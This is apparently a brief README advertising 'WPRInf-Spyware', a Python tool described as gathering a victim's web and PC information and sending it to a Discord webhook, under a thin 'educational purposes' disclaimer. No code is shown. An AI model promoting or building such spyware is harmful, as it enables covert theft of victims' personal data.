WPRInf-Spyware is a Python script that gathers information about a victim's web and PC information and sends it to a Discord webhook. This tool can be used for educational purposes and under the MIT license.


This is an improved version of [Roblox-Webhook](https://github.com/independent-coder/Roblox-Webhooks) â€“ smaller, lighter, and more portable.
